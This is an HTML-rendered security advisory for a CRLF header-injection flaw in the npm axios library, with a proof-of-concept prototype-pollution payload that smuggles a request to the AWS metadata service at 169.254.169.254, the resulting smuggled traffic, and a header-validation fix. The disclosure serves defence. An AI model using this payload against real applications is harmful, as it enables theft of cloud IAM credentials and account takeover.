@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axios Security Advisory - Cloud Metadata Exfiltration</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f6f8fa;
+            color: #24292e;
+            line-height: 1.6;
+        }
+        .container {
+            background: white;
+            padding: 32px;
+            border-radius: 6px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+        }
+        h1 {
+            color: #d73a49;
+            border-bottom: 3px solid #d73a49;
+            padding-bottom: 12px;
+        }
+        h2 {
+            color: #0366d6;
+            margin-top: 28px;
+        }
+        .severity-badge {
+            display: inline-block;
+            background-color: #d73a49;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-weight: bold;
+            margin: 12px 0;
+        }
+        .cvss-score {
+            background: #fff5f5;
+            border-left: 4px solid #d73a49;
+            padding: 16px;
+            margin: 16px 0;
+        }
+        .info-box {
+            background: #f6f8fa;
+            border: 1px solid #e1e4e8;
+            padding: 12px 16px;
+            border-radius: 4px;
+            margin: 16px 0;
+        }
+        code {
+            background: #f6f8fa;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: SFMono-Regular, Consolas, 'Liberation Mono', Menlo, monospace;
+        }
+        pre {
+            background: #f6f8fa;
+            padding: 16px;
+            border-radius: 4px;
+            overflow-x: auto;
+            border: 1px solid #e1e4e8;
+        }
+        .metric-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 16px 0;
+        }
+        .metric-table th, .metric-table td {
+            border: 1px solid #e1e4e8;
+            padding: 12px;
+            text-align: left;
+        }
+        .metric-table th {
+            background: #f6f8fa;
+            font-weight: 600;
+        }
+        .affected-versions {
+            background: #fff5f5;
+            padding: 16px;
+            border-radius: 4px;
+            margin: 16px 0;
+        }
+        .patched-versions {
+            background: #f0f9ff;
+            padding: 16px;
+            border-radius: 4px;
+            margin: 16px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Unrestricted Cloud Metadata Exfiltration via Header Injection Chain</h1>
+
+        <div class="severity-badge">Critical Severity</div>
+
+        <div class="info-box">
+            <strong>Advisory ID:</strong> GHSA-fvcv-3m26-pcqx<br>
+            <strong>CVE ID:</strong> CVE-2026-40175<br>
+            <strong>Published:</strong> April 9, 2026<br>
+            <strong>Reported by:</strong> raulvdv
+        </div>
+
+        <h2>Package Information</h2>
+        <p><strong>Affected Package:</strong> npm axios</p>
+
+        <div class="affected-versions">
+            <strong>Affected Versions:</strong> &lt;1.13.2
+        </div>
+
+        <div class="patched-versions">
+            <strong>Patched Versions:</strong> &ge;1.15.0
+        </div>
+
+        <h2>Vulnerability Description</h2>
+        <p>
+            The Axios library is vulnerable to a "Gadget" attack that escalates prototype pollution
+            into either Remote Code Execution or complete cloud infrastructure compromise by bypassing
+            AWS IMDSv2 protections.
+        </p>
+
+        <p>
+            The core issue stems from inadequate HTTP header sanitization combined with built-in
+            SSRF capabilities. The vulnerable component is located in
+            <code>lib/adapters/http.js</code> (Header Processing).
+        </p>
+
+        <h2>Technical Details</h2>
+
+        <h3>Root Cause</h3>
+        <p>
+            When prototype pollution occurs through any third-party dependency, Axios automatically
+            incorporates the polluted properties during configuration merging. The library fails to
+            validate header values for CRLF characters (<code>\r\n</code>), enabling request smuggling
+            payloads to be transmitted without direct user intervention.
+        </p>
+
+        <h3>Attack Requirements</h3>
+        <ul>
+            <li>Prototype pollution vulnerability in any upstream dependency</li>
+            <li>Application making any HTTP request via Axios (no special conditions needed)</li>
+            <li>Zero direct attacker input required</li>
+        </ul>
+
+        <h2>Proof of Concept Scenario</h2>
+
+        <h3>Step 1: Prototype Pollution</h3>
+        <p>
+            An attacker exploits a vulnerability in a query parser to set:
+        </p>
+        <pre><code>Object.prototype['x-amz-target'] = "dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\nGET /ignore";</code></pre>
+
+        <h3>Step 2: Normal Application Code</h3>
+        <pre><code>await axios.get('https://analytics.internal/pings');</code></pre>
+
+        <h3>Step 3: HTTP Request Smuggling</h3>
+        <p>
+            The resulting HTTP traffic contains two requests:
+        </p>
+        <pre><code>GET /pings HTTP/1.1
+Host: analytics.internal
+x-amz-target: dummy
+
+PUT /latest/api/token HTTP/1.1
+Host: 169.254.169.254
+X-aws-ec2-metadata-token-ttl-seconds: 21600</code></pre>
+
+        <h3>Step 4: Cloud Compromise</h3>
+        <p>
+            The smuggled request reaches the AWS Metadata Service, which returns a session token.
+            This grants access to IAM credentials, enabling complete account compromise.
+        </p>
+
+        <h2>Impact Analysis</h2>
+        <ul>
+            <li><strong>Security Control Bypass:</strong> Defeats AWS IMDSv2 session token protection</li>
+            <li><strong>Authentication Bypass:</strong> Injects sensitive headers to access internal systems</li>
+            <li><strong>Cache Poisoning:</strong> Modifies Host headers to poison shared caches</li>
+            <li><strong>Cloud Account Compromise:</strong> Full infrastructure takeover via credential theft</li>
+        </ul>
+
+        <h2>Affected Weaknesses</h2>
+        <table class="metric-table">
+            <tr>
+                <th>CWE</th>
+                <th>Description</th>
+            </tr>
+            <tr>
+                <td>CWE-113</td>
+                <td>Improper Neutralization of CRLF Sequences in HTTP Headers</td>
+            </tr>
+            <tr>
+                <td>CWE-444</td>
+                <td>Inconsistent Interpretation of HTTP Requests (Request/Response Smuggling)</td>
+            </tr>
+            <tr>
+                <td>CWE-918</td>
+                <td>Server-Side Request Forgery (SSRF)</td>
+            </tr>
+        </table>
+
+        <h2>Remediation</h2>
+
+        <h3>Recommended Fix</h3>
+        <p>
+            Validate all header values in both <code>lib/adapters/http.js</code> and
+            <code>xhr.js</code> before passing them to the underlying HTTP function:
+        </p>
+        <pre><code>// In lib/adapters/http.js
+utils.forEach(requestHeaders, function setRequestHeader(val, key) {
+  if (/[\r\n]/.test(val)) {
+    throw new Error('Security: Header value contains invalid characters');
+  }
+  // ... proceed to set header
+});</code></pre>
+
+        <h2>CVSS Score</h2>
+        <div class="cvss-score">
+            <strong>CVSS v3.1 Score: 10.0 (Critical)</strong><br>
+            <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</code>
+        </div>
+
+        <h2>References</h2>
+        <ul>
+            <li>OWASP: CRLF Injection (CWE-113)</li>
+            <li>MITRE: HTTP Request/Response Smuggling (CWE-444)</li>
+            <li>MITRE: Server-Side Request Forgery (CWE-918)</li>
+        </ul>
+
+        <div class="info-box">
+            <strong>Recommendation:</strong> Update Axios to version 1.15.0 or later immediately.
+            If immediate patching is impossible, implement additional header validation and
+            restrict outbound HTTP requests to known endpoints.
+        </div>
+    </div>
+</body>
+</html>
